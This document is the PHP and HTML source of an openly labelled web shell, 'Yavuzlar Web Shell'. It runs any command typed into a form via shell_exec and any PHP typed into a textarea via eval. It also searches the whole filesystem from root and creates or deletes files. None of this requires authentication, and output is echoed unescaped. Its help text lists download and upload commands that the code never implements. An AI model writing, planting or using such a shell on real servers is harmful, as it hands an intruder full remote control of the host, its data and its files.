<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Yavuzlar Web Shell</title>
    <style>
        body {
            background-color: #1e1e2f;
            color: #00d084;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        h1 {
            color: #ffffff;
            margin-bottom: 20px;
        }
        p {
            color: #bbbbbb;
        }
        table {
            width: 90%;
            color: #ffffff;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #00d084;
        }
        th {
            background-color: #2a2a3a;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #00d084;
            background-color: #222;
            color: #00d084;
            font-size: 14px;
            border-radius: 4px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #00d084;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        input[type="submit"]:hover {
            background-color: #00b36b;
        }
        .command, .php-code {
            width: 100%;
            margin-top: 10px;
        }
        form {
            width: 90%;
            margin-top: 20px;
        }
        pre {
            background-color: #2a2a3a;
            padding: 10px;
            border-radius: 5px;
            color: #00ff00;
            max-height: 200px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <img src="images/yavuzlar_logo1.png" alt="Yavuzlar Logo" style="position: absolute; top: 50px; right: 50px; width: 250px; height: auto;">
    <h1>Yavuzlar Web Shell</h1>

    <?php 
        function formatPermissions($filePath) {
            $perms = fileperms($filePath);
            $info = match (true) {
                ($perms & 0xC000) === 0xC000 => 's',
                ($perms & 0xA000) === 0xA000 => 'l',
                ($perms & 0x8000) === 0x8000 => '-',
                ($perms & 0x6000) === 0x6000 => 'b',
                ($perms & 0x4000) === 0x4000 => 'd',
                ($perms & 0x2000) === 0x2000 => 'c',
                ($perms & 0x1000) === 0x1000 => 'p',
                default => 'u',
            };

            $info .= (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
            $info .= (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
            $info .= (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

            return $info;
        }

        $currentDir = isset($_POST['directory']) ? $_POST['directory'] : getcwd(); 
    ?>
    <p><strong>Current Directory:</strong> <?php echo $currentDir; ?></p>

    <form method="POST">
        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
        <label>Execute Command:</label>
        <input type="text" name="command" class="command" placeholder="Enter your command">
        <input type="submit" value="Run">
    </form>

    <?php 
    if (isset($_POST['command'])) {
        $command = escapeshellcmd($_POST['command']);
        if ($command == 'help') {
            echo "<pre>
                available commands:
                1. ls - List directory contents
                2. pwd - Print the current working directory
                3. cd <directory> - Change the current directory
                4. touch <filename> - Create an empty file
                5. mkdir <directory_name> - Create a new directory
                6. rm <filename> - Remove a file
                7. rmdir <directory_name> - Remove an empty directory
                8. cat <filename> - Display the content of a file
                9. clear - Clear the terminal screen
                10. download <filename> - Download a file
                11. upload <filename> - Upload a file
            </pre>";
        } else {
            $output = shell_exec($command);
            if ($output) {
                echo "<pre>$output</pre>";
            }
        }
    } 
    ?>

    <form method="POST">
        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
        <label>PHP Code (without &lt;?php ?&gt; tags):</label>
        <textarea name="php_code" class="php-code" rows="4" placeholder="Write PHP code here"></textarea>
        <input type="submit" value="Execute PHP">
    </form>
    <?php 
    if (isset($_POST['php_code'])) {
        try {
            ob_start();
            eval($_POST['php_code']);
            $phpOutput = ob_get_clean();
            echo "<pre>$phpOutput</pre>";
        } catch (Throwable $e) {
            echo "<pre>Error: " . $e->getMessage() . "</pre>";
        }
    } 
    ?>

    <h2>Search Files and Directories</h2>
    <form method="POST">
        <label>Search:</label>
        <input type="text" name="search_term" placeholder="Enter file or directory name">
        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
        <input type="submit" value="Search">
    </form>

    <?php
    define('ROOT_DIR', '/'); 

    function searchFilesAndDirectories($directory, $term) {
        $matches = [];
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
        foreach ($iterator as $file) {
            if (stripos($file->getFilename(), $term) !== false) {
                $matches[] = $file->getPathname();
            }
        }
        return $matches;
    }

    if (isset($_POST['search_term'])) {
        $searchTerm = $_POST['search_term'];
        $results = searchFilesAndDirectories(ROOT_DIR, $searchTerm);

        if (empty($results)) {
            echo "<p>No files or directories found for '$searchTerm'.</p>";
        } else {
            echo "<h3>Search Results for '$searchTerm':</h3><ul>";
            foreach ($results as $result) {
                echo "<li>$result
                    <form method='POST' style='display:inline-block;'>
                        <input type='hidden' name='directory' value='" . dirname($result) . "'>
                        <input type='hidden' name='view_file' value='" . basename($result) . "'>
                        <input type='submit' value='View'>
                    </form>
                    <form method='POST' style='display:inline-block;'>
                        <input type='hidden' name='directory' value='" . dirname($result) . "'>
                        <input type='hidden' name='edit_file' value='" . basename($result) . "'>
                        <input type='submit' value='Edit'>
                    </form>
                    <form method='POST' style='display:inline-block;'>
                        <input type='hidden' name='directory' value='" . dirname($result) . "'>
                        <input type='hidden' name='delete_file' value='" . basename($result) . "'>
                        <input type='submit' value='Delete' onclick='return confirm(\"Are you sure you want to delete this file?\");'>
                    </form>
                </li>";
            }
            echo "</ul>";
        }
    }
    ?>

    <h2>Files in Directory</h2>
    <table>
        <tr>
            <th>File Name</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
        <?php
        $files = scandir($currentDir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                echo "<tr>
                        <td>$file</td>
                        <td>" . formatPermissions($currentDir . '/' . $file) . "</td>
                        <td>
                            <form method='POST' style='display:inline-block;'>
                                <input type='hidden' name='directory' value='$currentDir'>
                                <input type='hidden' name='view_file' value='$file'>
                                <input type='submit' value='View'>
                            </form>
                            <form method='POST' style='display:inline-block;'>
                                <input type='hidden' name='directory' value='$currentDir'>
                                <input type='hidden' name='edit_file' value='$file'>
                                <input type='submit' value='Edit'>
                            </form>
                            <form method='POST' style='display:inline-block;'>
                                <input type='hidden' name='directory' value='$currentDir'>
                                <input type='hidden' name='delete_file' value='$file'>
                                <input type='submit' value='Delete' onclick='return confirm(\"Are you sure you want to delete this file?\");'>
                            </form>
                        </td>
                    </tr>";
            }
        }
        ?>
    </table>

    <h2>Add File</h2>
    <form method="POST">
        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
        <label>File Name:</label>
        <input type="text" name="new_file_name" required>
        <label>File Content:</label>
        <textarea name="new_file_content" rows="4" required></textarea>
        <input type="submit" value="Add File">
    </form>

    <?php 
    if (isset($_POST['new_file_name']) && isset($_POST['new_file_content'])) {
        $newFileName = $_POST['new_file_name'];
        $newFilePath = $currentDir . '/' . $newFileName;
        $content = $_POST['new_file_content'];

        if (file_put_contents($newFilePath, $content) !== false) {
            echo "<p>File '$newFileName' has been created successfully.</p>";
        } else {
            echo "<p>Failed to create file '$newFileName'.</p>";
        }
    }

    if (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDir . '/' . $_POST['delete_file'];
        if (unlink($fileToDelete)) {
            echo "<p>File '{$_POST['delete_file']}' has been deleted successfully.</p>";
        } else {
            echo "<p>Failed to delete file '{$_POST['delete_file']}'.</p>";
        }
    }
    ?>
</body>
</html>
